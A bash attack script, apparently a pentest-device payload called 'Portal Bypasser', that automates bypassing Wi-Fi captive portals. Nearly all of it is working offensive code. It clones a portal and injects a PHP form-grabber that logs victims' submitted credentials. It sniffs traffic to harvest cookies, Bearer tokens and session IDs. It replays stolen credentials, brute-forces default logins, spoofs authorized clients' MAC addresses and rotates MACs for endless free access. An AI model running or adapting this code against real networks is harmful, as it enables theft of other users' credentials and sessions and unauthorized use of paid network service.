#!/bin/bash
# ============================================================
# NullSec: Captive Portal Bypasser & Credential Replayer
# Author: bad-antics
# Description: Automatically bypass captive portals and replay creds
# Category: pager/bypass
#
# UNIQUE FEATURES:
# - Auto-detects captive portal type (hotel, airport, etc)
# - Clones and replays captured credentials
# - MAC rotation for unlimited access
# - Session token harvesting and replay
# - First tool to automate full portal bypass cycle
# ============================================================

PAYLOAD_NAME="Portal Bypasser"
VERSION="1.0.0"
LOOT="/root/loot/portals"
LOG="$LOOT/bypass.log"

# Known portal signatures
declare -A PORTAL_SIGNATURES=(
    ["Nomadix"]="nomadix|gateway.example"
    ["Aruba"]="aruba|clearpass|setmeup"
    ["Cisco"]="cisco|wlc|web-auth"
    ["Ruckus"]="ruckus|zonedirector"
    ["Guest-Internet"]="guest-internet|hsigate"
    ["Zyxel"]="zyxel|cloudcnm"
    ["ANTLabs"]="antlabs|igportal"
    ["Mikrotik"]="mikrotik|hotspot"
    ["UniFi"]="unifi|ubnt|portal"
)

init_payload() {
    mkdir -p "$LOOT"/{sessions,creds,macs}
    echo "[$(date)] $PAYLOAD_NAME started" >> "$LOG"
    NOTIFY "PORTAL BYPASS" "Initializing..."
}

# Detect captive portal
detect_portal() {
    NOTIFY "DETECTING" "Looking for captive portal..."
    
    # Connect to open network
    local OPEN_NET=$(iwlist wlan0 scan 2>/dev/null | grep -B5 "Encryption:off" | \
        grep "ESSID" | head -1 | cut -d'"' -f2)
    
    if [ -z "$OPEN_NET" ]; then
        NOTIFY "NO OPEN" "No open networks found"
        return 1
    fi
    
    NOTIFY "CONNECTING" "Joining: $OPEN_NET"
    
    # Connect
    wpa_supplicant -i wlan0 -c <(echo "network={ssid=\"$OPEN_NET\" key_mgmt=NONE}") -B 2>/dev/null
    sleep 3
    dhclient wlan0 2>/dev/null
    sleep 2
    
    # Test for portal redirect
    PORTAL_URL=$(curl -s -I -m 5 "http://detectportal.firefox.com/success.txt" 2>/dev/null | \
        grep -i "Location:" | cut -d' ' -f2 | tr -d '\r')
    
    if [ -z "$PORTAL_URL" ]; then
        # Try alternate detection
        PORTAL_URL=$(curl -s -m 5 -o /dev/null -w '%{redirect_url}' "http://www.msftconnecttest.com/connecttest.txt")
    fi
    
    if [ -n "$PORTAL_URL" ] && [ "$PORTAL_URL" != "http://www.msftconnecttest.com/connecttest.txt" ]; then
        NOTIFY "PORTAL!" "Detected: $PORTAL_URL"
        echo "$PORTAL_URL" > "$LOOT/current_portal.txt"
        
        # Identify portal type
        PORTAL_HTML=$(curl -s -L -m 10 "$PORTAL_URL" 2>/dev/null)
        
        for vendor in "${!PORTAL_SIGNATURES[@]}"; do
            if echo "$PORTAL_HTML" | grep -qiE "${PORTAL_SIGNATURES[$vendor]}"; then
                NOTIFY "IDENTIFIED" "Portal vendor: $vendor"
                echo "$vendor" > "$LOOT/portal_type.txt"
                break
            fi
        done
        
        return 0
    else
        NOTIFY "NO PORTAL" "Network has direct access"
        return 1
    fi
}

# Clone portal for credential capture
clone_portal() {
    local PORTAL_URL="$1"
    local CLONE_DIR="/www/portal_clone"
    
    NOTIFY "CLONING" "Downloading portal..."
    
    mkdir -p "$CLONE_DIR"
    
    # Download portal with all assets
    wget -q -r -l 2 -k -p -E -H -D "$(echo $PORTAL_URL | cut -d'/' -f3)" \
        "$PORTAL_URL" -P "$CLONE_DIR" 2>/dev/null
    
    # Inject credential capture
    find "$CLONE_DIR" -name "*.html" -exec sed -i \
        's|action="|action="/capture.php" data-orig="|g' {} \;
    
    # Create capture script
    cat > "$CLONE_DIR/capture.php" << 'PHP'
<?php
$loot = "/root/loot/portals/creds/portal_creds.txt";
$data = date("Y-m-d H:i:s") . " | " . $_SERVER['REMOTE_ADDR'] . " | ";
$data .= json_encode($_POST) . "\n";
file_put_contents($loot, $data, FILE_APPEND);
header("Location: " . ($_POST['data-orig'] ?? '/'));
?>
PHP
    
    NOTIFY "CLONED" "Portal ready for credential capture"
}

# MAC address rotation
rotate_mac() {
    NOTIFY "MAC ROTATE" "Generating new MAC..."
    
    # Generate random MAC with common vendor OUI
    local OUIS=("00:1A:2B" "00:25:00" "AC:81:12" "DC:A6:32" "B8:27:EB")
    local OUI=${OUIS[$RANDOM % ${#OUIS[@]}]}
    local NEW_MAC="$OUI:$(openssl rand -hex 3 | sed 's/\(..\)/\1:/g;s/:$//')"
    
    # Save original if not saved
    [ ! -f "$LOOT/macs/original.txt" ] && \
        ip link show wlan0 | grep ether | awk '{print $2}' > "$LOOT/macs/original.txt"
    
    # Apply new MAC
    ip link set wlan0 down
    ip link set wlan0 address "$NEW_MAC"
    ip link set wlan0 up
    
    echo "$NEW_MAC" >> "$LOOT/macs/used.txt"
    NOTIFY "NEW MAC" "$NEW_MAC"
    
    echo "$NEW_MAC"
}

# Session token harvester
harvest_sessions() {
    NOTIFY "HARVESTING" "Capturing session tokens..."
    
    local SESSION_FILE="$LOOT/sessions/tokens_$(date +%Y%m%d_%H%M).txt"
    
    # Capture HTTP traffic for cookies/tokens
    timeout 60 tcpdump -i wlan0 -A -s 0 'tcp port 80 or tcp port 443' 2>/dev/null | \
        grep -oE "(Cookie|Set-Cookie|Authorization|Bearer|token|session|PHPSESSID)[=:][^;\r\n]+" | \
        sort -u > "$SESSION_FILE" &
    
    # Also capture DNS for portal domains
    tcpdump -i wlan0 -n 'port 53' 2>/dev/null | \
        grep -oE '[a-zA-Z0-9.-]+\.(portal|guest|wifi|hotspot)\.[a-zA-Z]+' | \
        sort -u >> "$LOOT/sessions/portal_domains.txt" &
    
    NOTIFY "CAPTURING" "Session capture running (60s)..."
    sleep 60
    
    TOKEN_COUNT=$(wc -l < "$SESSION_FILE" 2>/dev/null || echo 0)
    NOTIFY "HARVESTED" "$TOKEN_COUNT tokens captured"
}

# Replay captured credentials
replay_credentials() {
    local CRED_FILE="$LOOT/creds/portal_creds.txt"
    
    [ ! -f "$CRED_FILE" ] && {
        NOTIFY "NO CREDS" "No captured credentials to replay"
        return 1
    }
    
    NOTIFY "REPLAYING" "Attempting credential replay..."
    
    local PORTAL_URL=$(cat "$LOOT/current_portal.txt" 2>/dev/null)
    [ -z "$PORTAL_URL" ] && return 1
    
    # Get last captured creds
    local LAST_CRED=$(tail -1 "$CRED_FILE" | rev | cut -d'|' -f1 | rev)
    
    # Extract form data
    local USERNAME=$(echo "$LAST_CRED" | jq -r '.username // .user // .email // ""' 2>/dev/null)
    local PASSWORD=$(echo "$LAST_CRED" | jq -r '.password // .pass // ""' 2>/dev/null)
    
    if [ -n "$USERNAME" ]; then
        # Find login form action
        local FORM_ACTION=$(curl -s "$PORTAL_URL" | grep -oE 'action="[^"]+' | head -1 | cut -d'"' -f2)
        
        # Replay credentials
        RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
            -d "username=$USERNAME&password=$PASSWORD" \
            -X POST "$FORM_ACTION" 2>/dev/null)
        
        # Check if we got access
        if curl -s -b /tmp/cookies.txt "http://www.google.com" 2>/dev/null | grep -q "google"; then
            NOTIFY "SUCCESS!" "Credential replay worked!"
            return 0
        fi
    fi
    
    NOTIFY "FAILED" "Credential replay unsuccessful"
    return 1
}

# Bypass methods
bypass_portal() {
    NOTIFY "BYPASS" "Attempting portal bypass methods..."
    
    local SUCCESS=false
    
    # Method 1: Try common default credentials
    local DEFAULT_CREDS=(
        "guest:guest"
        "admin:admin"
        "user:user"
        "test:test"
        "demo:demo"
        "":"" # Empty credentials
    )
    
    for cred in "${DEFAULT_CREDS[@]}"; do
        USER=$(echo "$cred" | cut -d: -f1)
        PASS=$(echo "$cred" | cut -d: -f2)
        
        # Try credential
        curl -s -c /tmp/cookies.txt -d "username=$USER&password=$PASS" \
            "$(cat $LOOT/current_portal.txt)" 2>/dev/null
        
        if test_internet; then
            NOTIFY "BYPASSED" "Default creds worked: $USER:$PASS"
            SUCCESS=true
            break
        fi
    done
    
    if ! $SUCCESS; then
        # Method 2: Spoof authorized MAC
        NOTIFY "MAC SPOOF" "Trying MAC spoofing..."
        
        # Look for authorized clients
        airodump-ng wlan0 --write-interval 1 -w /tmp/auth_scan --output-format csv &
        sleep 15
        killall airodump-ng 2>/dev/null
        
        # Find clients with data (likely authorized)
        AUTH_MAC=$(grep -E "^[0-9A-Fa-f]{2}:" /tmp/auth_scan*.csv 2>/dev/null | \
            awk -F',' '$7 > 5000 {print $1}' | head -1 | tr -d ' ')
        
        if [ -n "$AUTH_MAC" ]; then
            NOTIFY "SPOOFING" "Cloning MAC: $AUTH_MAC"
            
            killall wpa_supplicant dhclient 2>/dev/null
            ip link set wlan0 down
            ip link set wlan0 address "$AUTH_MAC"
            ip link set wlan0 up
            
            # Reconnect
            wpa_supplicant -i wlan0 -c <(echo "network={ssid=\"$(iwgetid -r)\" key_mgmt=NONE}") -B
            sleep 3
            dhclient wlan0
            sleep 2
            
            if test_internet; then
                NOTIFY "BYPASSED" "MAC spoofing successful!"
                SUCCESS=true
            fi
        fi
    fi
    
    if ! $SUCCESS; then
        # Method 3: DNS tunnel
        NOTIFY "DNS TUNNEL" "Setting up DNS tunnel..."
        
        # This would require a DNS tunnel server
        # Placeholder for actual implementation
        NOTIFY "TUNNEL" "DNS tunnel requires external server"
    fi
    
    $SUCCESS && return 0 || return 1
}

# Test internet connectivity
test_internet() {
    curl -s -m 5 "http://www.google.com/generate_204" 2>/dev/null && return 0
    return 1
}

# Unlimited access mode (continuous MAC rotation)
unlimited_mode() {
    NOTIFY "UNLIMITED" "Starting unlimited access mode..."
    
    while true; do
        # Test if we have internet
        if ! test_internet; then
            NOTIFY "BLOCKED" "Access expired, rotating..."
            
            # Rotate MAC
            rotate_mac
            
            # Reconnect
            killall wpa_supplicant dhclient 2>/dev/null
            sleep 1
            
            local SSID=$(cat /tmp/connected_ssid.txt 2>/dev/null)
            [ -n "$SSID" ] && {
                wpa_supplicant -i wlan0 -c <(echo "network={ssid=\"$SSID\" key_mgmt=NONE}") -B
                sleep 3
                dhclient wlan0
                sleep 2
            }
            
            # Try bypass again
            bypass_portal
        fi
        
        sleep 60
    done
}

# Main
main() {
    init_payload
    
    if detect_portal; then
        # Clone portal for future cred capture
        clone_portal "$(cat $LOOT/current_portal.txt)"
        
        # Try bypass methods
        if bypass_portal; then
            NOTIFY "ACCESS" "Internet access gained!"
            
            # Save network for reconnection
            iwgetid -r > /tmp/connected_ssid.txt
            
            # Start session harvesting
            harvest_sessions &
            
            # Start unlimited mode
            unlimited_mode
        else
            # Couldn't bypass, wait for credentials
            NOTIFY "WAITING" "Start credential capture mode"
            
            # Deploy our cloned portal as evil twin
            # (requires additional setup)
        fi
    fi
}

NOTIFY() {
    echo -e "\033[0;32m[$1]\033[0m $2"
    echo "[$(date '+%H:%M:%S')] [$1] $2" >> "$LOG"
}

main "$@"
